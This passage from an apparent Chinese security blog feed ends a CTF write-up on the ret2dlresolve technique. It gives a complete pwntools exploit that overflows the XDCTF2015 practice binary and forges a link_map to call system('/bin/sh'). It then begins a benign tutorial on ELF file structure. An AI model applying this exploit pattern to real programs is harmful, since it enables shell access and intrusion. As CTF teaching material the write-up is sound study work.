class="token number">0xF8</span><span class="token punctuation">(</span><span class="token number">32</span>位下是<span class="token number">0x7C</span><span class="token punctuation">)</span>dynstr，dynsym，dynrel表，rel<span class="token punctuation">.</span>plt表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>fake_link_map：</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#l_addr  </span>fake_link_map <span class="token operator">=</span> p64<span class="token punctuation">(</span>l_addr<span class="token punctuation">)</span>  <span class="token comment">#两个函数的偏移</span><span class="token comment">#由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中  </span>fake_link_map <span class="token operator">+=</span> fake_dyn_strtab  fake_link_map <span class="token operator">+=</span> fake_dyn_symtab  fake_link_map <span class="token operator">+=</span> fake_dyn_rel  fake_link_map <span class="token operator">+=</span> fake_rel  fake_link_map  <span class="token operator">=</span> fake_link_map<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  <span class="token comment">#dyn_strtab的指针  </span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_strtab_addr<span class="token punctuation">)</span>  <span class="token comment">#dyn_strsym的指针  </span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_symtab_addr<span class="token punctuation">)</span> <span class="token comment">#fake_link_map_addr + 0x70  </span><span class="token comment">#存入/bin/sh字符串  </span>fake_link_map <span class="token operator">+=</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>  <span class="token comment">#在fake_link_map_addr + 0xF8处，是rel.plt指针  </span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_rel_addr<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp（基本通过，稍微改改就行）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./main_partial_relro_64"</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcbss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x100</span>vuln <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004007a3</span> <span class="token comment">#: pop rdi ; ret</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x00000000004007a1</span> <span class="token comment">#: pop rsi ; pop r15 ; ret</span>plt_load <span class="token operator">=</span> <span class="token number">0x400506</span><span class="token comment">#两个函数的偏移</span>l_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>r_offset <span class="token operator">=</span> bss <span class="token operator">+</span> l_addr <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment">#如果偏移是负数，则取补码</span><span class="token keyword">if</span> l_addr <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    l_addr <span class="token operator">+=</span> <span class="token number">0x10000000000000000</span><span class="token comment">#真正的dynstr地址</span>dynstr <span class="token operator">=</span> <span class="token number">0x4003B0</span><span class="token comment">#伪造的fake_link_map在bss + 0x100地址处</span>fake_link_map_addr <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x100</span><span class="token comment">#伪造dyn_strtab，放在link_map + 0x68处</span>fake_dyn_strtab_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x8</span>fake_dyn_strtab <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token comment">#伪造dyn_symtab，放在link_map + 0x70处</span>fake_dyn_symtab_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x18</span>fake_dyn_symtab <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token comment">#伪造dyn_rel，放在link_map + 0xf8处</span>fake_dyn_rel_addr <span class="token operator">=</span> fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x28</span>fake_dyn_rel <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">)</span><span class="token comment">#伪造rel.plt</span>fake_rel <span class="token operator">=</span> p64<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#fake_link_map</span>fake_link_map  <span class="token operator">=</span> p64<span class="token punctuation">(</span>l_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> fake_dyn_strtabfake_link_map <span class="token operator">+=</span> fake_dyn_symtabfake_link_map <span class="token operator">+=</span> fake_dyn_relfake_link_map <span class="token operator">+=</span> fake_relfake_link_map  <span class="token operator">=</span> fake_link_map<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_strtab_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_symtab_addr<span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>fake_link_map <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_dyn_rel_addr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>func<span class="token punctuation">,</span> rdi<span class="token punctuation">,</span> rsi<span class="token punctuation">,</span> rdx<span class="token punctuation">,</span> ret_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40079A</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400780</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x38</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token comment">#将fake_link_map读入bss段中，然后在返回vuln</span>payload  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x70</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_link_map<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>fake_link_map<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>rop  <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">0x78</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>plt_load<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_link_map_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态链接 </tag>
            
            <tag> ret2dlresolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件结构</title>
      <link href="/2023/04/18/elf-wen-jian-jie-gou/"/>
      <url>/2023/04/18/elf-wen-jian-jie-gou/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>ELF （Executable and Linkable Format）文件，也就是在 Linux 中的目标文件，从结构上讲，它是<strong>已经编译后的可执行文件格式，但是还没有经过链接的过程，和真正的可执行文件在结构上稍有不同</strong>。但目标文件一般和可执行文件格式一起采用一种格式存储，从广义上看，可以把目标文件与可执行文件看成是一种类型的文件，主要有以下四种种类型：</p><table><thead><tr><th align="center"><strong>ELF文件类型</strong></th><th align="center"><strong>说明</strong></th><th align="center"><strong>示例</strong></th></tr></thead><tbody><tr><td align="center">可重定位文件（Relocatable）</td><td align="center">这类文件包含了代码和数据，可以被用来链接成可执行文件或共享目标文件，静态链接库可可以归为这一类。</td><td align="center">Linux的.o</td></tr><tr><td align="center">可执行文件（Excutable File）</td><td align="center">这类文件包含了可直接执行的程序，比如ELF可执行文件，一般都没有扩展名。</td><td align="center">比如/bin/bash文件</td></tr><tr><td align="center">共享目标文件（Shared Object File）</td><td align="center">这类文件包含了代码和数据，这种文件是我们所称的库文件。</td><td align="center">Linux的.so，如/lib/glibc-2.5.so</td></tr><tr><td align="center">核心转储文件（Core Dump File）</td><td align="center">当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件。</td><td align="center">Linux下的core dump</td></tr></tbody></table><p>对于共享目标文件：</p><ul><li>共享目标文件（Shared Object File），包含代码和数据，这种文件是我们所称的库文件，一般以 <code>.so</code> 结尾。一般情况下，它有以下两种使用情景：<ul><li>链接器（Link eDitor, ld）可能会处理它和其它可重定位文件以及共享目标文件，生成另外一个目标文件。</li><li>动态链接器（Dynamic Linker）将它与可执行文件以及其它共享目标组合在一起生成进程镜像。</li></ul></li></ul><p>目标文件由汇编器和链接器创建，是文本程序的二进制形式，可以直接在处理器上运行。那些需要虚拟机才能够执行的程序 (Java) 不属于这一范围。</p><h1 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h1><p><strong>目标文件既会参与程序链接又会参与程序执行</strong>。出于方便性和效率考虑，根据过程的不同，目标文件格式提供了其内容的两种并行视图，如下</p><p><img src="/2023/04/18/elf-wen-jian-jie-gou/object_file_format.png" alt="img"></p><p>首先，我们来<strong>关注一下链接视图</strong>。</p><p>文件开始处是 ELF 头部（ <strong>ELF Header</strong>），它给出了整个文件的组织情况。</p><p>如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。<strong>用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。</strong></p><p>节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。</p><p><strong>节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。</strong></p><p>这里给出一个关于链接视图比较形象的展示：</p><p><img src="/2023/04/18/elf-wen-jian-jie-gou/elf-layout.png" alt="img"></p><p>对于<strong>执行视图</strong>来说，其主要的不同点在于没有了 section，而有了多个 segment。其实这里的 segment 大都是来源于链接视图中的 section。</p><p>注意:</p><blockquote><p>尽管图中是按照 ELF 头，程序头部表，节区，节区头部表的顺序排列的。但实际上除了 ELF 头部表以外，其它部分都没有严格的顺序。</p></blockquote><h1 id="SimpleSection-o目标文件解析"><a href="#SimpleSection-o目标文件解析" class="headerlink" title="SimpleSection.o目标文件解析"></a>SimpleSection.o目标文件解析</h1><p>我们通过调试来学习ELF的文件结构：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* SimpleSction.cLinux :编译命令：gcc -c SimpleSection.c -m32*/</span><span class="token keyword">int</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> format <span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> global_init_var <span class="token operator">=</span> <span class="token number">84</span><span class="token punctuation">;</span><span class="token keyword">int</span> global_uninit_var2<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">int</span> static_init_var <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">int</span> static_uninit_var2<span class="token punctuation">;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> b<span class="token punctuation">;</span>        <span class="token function">func</span><span class="token punctuation">(</span>static_init_var <span class="token operator">+</span> static_uninit_var2 <span class="token operator">+</span> a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过objdump这个工具查看一下编译后的.o文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">simpleSection.o:     <span class="token function">file</span> <span class="token function">format</span> elf32-i386Sections:Idx Name          Size      VMA       LMA       File off  Algn  <span class="token number">0</span> .group        00000008  00000000  00000000  00000034  <span class="token number">2</span>**2                  CONTENTS, READONLY, GROUP, LINK_ONCE_DISCARD  <span class="token number">1</span> .text         00000081  00000000  00000000  0000003c  <span class="token number">2</span>**0                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE  <span class="token number">2</span> .data         00000008  00000000  00000000  000000c0  <span class="token number">2</span>**2                  CONTENTS, ALLOC, LOAD, DATA  <span class="token number">3</span> .bss          00000008  00000000  00000000  000000c8  <span class="token number">2</span>**2                  ALLOC  <span class="token number">4</span> .rodata       00000004  00000000  00000000  000000c8  <span class="token number">2</span>**0                  CONTENTS, ALLOC, LOAD, READONLY, DATA  <span class="token number">5</span> .text.__x86.get_pc_thunk.ax 00000004  00000000  00000000  000000cc  <span class="token number">2</span>**0                  CONTENTS, ALLOC, LOAD, READONLY, CODE  <span class="token number">6</span> .comment      0000002c  00000000  00000000  000000d0  <span class="token number">2</span>**0                  CONTENTS, READONLY  <span class="token number">7</span> .note.GNU-stack 00000000  00000000  00000000  000000fc  <span class="token number">2</span>**0                  CONTENTS, READONLY  <span class="token number">8</span> .eh_frame     0000007c  00000000  00000000  000000fc  <span class="token number">2</span>**2                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到.<strong>text段、.data段、.bss段、只读数据段（.rodata）、注释信息段（.comment）、堆栈提示段（.note.GNU-stack）、gcc处理异常产生的段（.eh_frame），.group段</strong>。几个重要的段的属性：</p><table><thead><tr><th align="center"><strong>属性名</strong></th><th align="center"><strong>作用</strong></th></tr></thead><tbody><tr><td align="center">size</td><td align="center">段的大小</td></tr><tr><td align="center">File Offset</td><td align="center">段在文件中的偏移</td></tr><tr><td align="center">CONTENTS</td><td align="center">表示改段在文件中存在</td></tr></tbody></table><p>通过objdump可以看到bss段标注的是ALLOC，说明bss段不是在文件中的，堆栈提示段的size大小为0，也认为他不在ELF文件中。</p><blockquote><table><thead><tr><th>代码段</th><th>程序源代码编译后的机器指令</th><th>.code /.text段</th></tr></thead><tbody><tr><td>数据段</td><td>已初始化的全局变量和局部静态变量</td><td>.data段</td></tr><tr><td>BSS段</td><td>未初始化的全局变量和局部变量</td><td>.bss段</td></tr></tbody></table></blockquote><h2 id="文件头–ELF-Header"><a href="#文件头–ELF-Header" class="headerlink" title="文件头–ELF Header"></a>文件头–ELF Header</h2><p>可以使用： <code>readelf -h simpleSection.o</code>查看ELF Header</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ELF Header:  Magic:   7f <span class="token number">45</span> 4c <span class="token number">46</span> 01 01 01 00 00 00 00 00 00 00 00 00  Class:                             ELF32  Data:                              <span class="token number">2</span>'s complement, little endian  Version:                           <span class="token number">1</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span>  OS/ABI:                            UNIX - System V  ABI Version:                       <span class="token number">0</span>  Type:                              REL <span class="token punctuation">(</span>Relocatable <span class="token function">file</span><span class="token punctuation">)</span>  Machine:                           Intel <span class="token number">80386</span>  Version:                           0x1  Entry point address:               0x0  Start of program headers:          <span class="token number">0</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>  Start of section headers:          <span class="token number">1012</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>  Flags:                             0x0  Size of this header:               <span class="token number">52</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Size of program headers:           <span class="token number">0</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Number of program headers:         <span class="token number">0</span>  Size of section headers:           <span class="token number">40</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>  Number of section headers:         <span class="token number">15</span>  Section header string table index: <span class="token number">14</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从输出结果可以看到ELF的文件头定义了<strong>ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序入口和长度、段表的位置和长度及段的数量</strong>等。</p><h3 id="数据形式"><a href="#数据形式" class="headerlink" title="数据形式"></a>数据形式</h3><p>ELF 文件格式支持 8 位 / 32 位体系结构。当然，这种格式是可以扩展的，也可以支持更小的或者更大位数的处理器架构。因此，目标文件会包含一些控制数据，这部分数据表明了目标文件所使用的架构，这也使得它可以被通用的方式来识别和解释。目标文件中的其它数据采用目的处理器的格式进行编码，与在何种机器上创建没有关系。这里其实想表明的意思目标文件可以进行交叉编译，我们可以在 x86 平台生成 arm 平台的可执行代码。</p><p>目标文件中的所有数据结构都遵从 “自然” 大小和对齐规则。如下</p><table><thead><tr><th>名称</th><th>长度</th><th>对齐方式</th><th>用途</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>无符号程序地址</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>无符号半整型</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>无符号文件偏移</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td>有符号大整型</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>无符号大整型</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>无符号小整型</td></tr></tbody></table><p>如果必要，数据结构可以包含显式地补齐来确保 4 字节对象按 4 字节对齐，强制数据结构的大小是 4 的整数倍等等。数据同样适用是对齐的。因此，包含一个 Elf32_Addr 类型成员的结构体会在文件中的 4 字节边界处对齐。</p><p>为了具有可移植性，ELF 文件不使用位域。</p><h2 id="节-段-表–Section-Header-Table"><a href="#节-段-表–Section-Header-Table" class="headerlink" title="节(段)表–Section Header Table"></a>节(段)表–<strong>Section Header Table</strong></h2><p>前面讲了ELF文件中有很多的段，但是如果没有人管他们就会很乱套，这个时候这些段的头头段表（Section Header Table）出现了，段表就是确保这些段的基本属性的结构。<strong>段表是ELF文件除头文件意外最重要的结构，描述了ELF的各个段的信息，比如每个段的段名、长度、在文件中的偏移、读写权限等。编译器、链接器和装载器都是依靠段表来定位和访问各个段的属性的。</strong>前面使用objdump列出了simpleSction.o的主要段，其实是不全的，可以使用readelf工具查看完整的段结构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>./ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1.png<span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>./ELF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/1.png<span class="token punctuation">)</span>There are <span class="token number">15</span> section headers, starting at offset 0x3f4:Section Headers:  <span class="token punctuation">[</span>Nr<span class="token punctuation">]</span> Name              Type            Addr     Off    Size   ES Flg Lk Inf Al  <span class="token punctuation">[</span> <span class="token number">0</span><span class="token punctuation">]</span>                   NULL            00000000 000000 000000 00      <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">0</span>  <span class="token punctuation">[</span> <span class="token number">1</span><span class="token punctuation">]</span> .group            GROUP           00000000 000034 000008 04     <span class="token number">12</span>  <span class="token number">12</span>  <span class="token number">4</span>  <span class="token punctuation">[</span> <span class="token number">2</span><span class="token punctuation">]</span> .text             PROGBITS        00000000 00003c 000081 00  AX  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span> <span class="token number">3</span><span class="token punctuation">]</span> .rel.text         REL             00000000 000310 000048 08   I <span class="token number">12</span>   <span class="token number">2</span>  <span class="token number">4</span>  <span class="token punctuation">[</span> <span class="token number">4</span><span class="token punctuation">]</span> .data             PROGBITS        00000000 0000c0 000008 00  WA  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">4</span>  <span class="token punctuation">[</span> <span class="token number">5</span><span class="token punctuation">]</span> .bss              NOBITS          00000000 0000c8 000008 00  WA  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">4</span>  <span class="token punctuation">[</span> <span class="token number">6</span><span class="token punctuation">]</span> .rodata           PROGBITS        00000000 0000c8 000004 00   A  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span> <span class="token number">7</span><span class="token punctuation">]</span> .text.__x86.<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> PROGBITS        00000000 0000cc 000004 00 AXG  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span> <span class="token number">8</span><span class="token punctuation">]</span> .comment          PROGBITS        00000000 0000d0 00002c 01  MS  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span> <span class="token number">9</span><span class="token punctuation">]</span> .note.GNU-stack   PROGBITS        00000000 0000fc 000000 00      <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> .eh_frame         PROGBITS        00000000 0000fc 00007c 00   A  <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">4</span>  <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> .rel.eh_frame     REL             00000000 000358 000018 08   I <span class="token number">12</span>  <span class="token number">10</span>  <span class="token number">4</span>  <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> .symtab           SYMTAB          00000000 000178 000100 <span class="token number">10</span>     <span class="token number">13</span>   <span class="token number">9</span>  <span class="token number">4</span>  <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> .strtab           STRTAB          00000000 000278 000098 00      <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>  <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> .shstrtab         STRTAB          00000000 000370 000082 00      <span class="token number">0</span>   <span class="token number">0</span>  <span class="token number">1</span>Key to Flags:  W <span class="token punctuation">(</span>write<span class="token punctuation">)</span>, A <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span>, X <span class="token punctuation">(</span>execute<span class="token punctuation">)</span>, M <span class="token punctuation">(</span>merge<span class="token punctuation">)</span>, S <span class="token punctuation">(</span>strings<span class="token punctuation">)</span>, I <span class="token punctuation">(</span>info<span class="token punctuation">)</span>,  L <span class="token punctuation">(</span>link order<span class="token punctuation">)</span>, O <span class="token punctuation">(</span>extra OS processing required<span class="token punctuation">)</span>, G <span class="token punctuation">(</span>group<span class="token punctuation">)</span>, T <span class="token punctuation">(</span>TLS<span class="token punctuation">)</span>,  C <span class="token punctuation">(</span>compressed<span class="token punctuation">)</span>, x <span class="token punctuation">(</span>unknown<span class="token punctuation">)</span>, o <span class="token punctuation">(</span>OS specific<span class="token punctuation">)</span>, E <span class="token 